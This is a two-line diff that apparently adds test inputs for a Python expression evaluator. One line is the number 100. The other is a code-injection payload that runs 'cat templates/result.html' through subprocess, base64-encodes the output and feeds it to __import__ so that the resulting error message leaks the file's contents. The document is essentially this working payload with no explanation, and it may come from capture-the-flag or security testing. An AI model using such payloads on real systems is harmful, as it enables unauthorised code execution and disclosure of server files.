@@ -1,0 +1,2 @@
+100
+__import__(str(__import__("base64").b64encode(str(__import__("subprocess").check_output(["cat","templates/result.html"])).encode())))
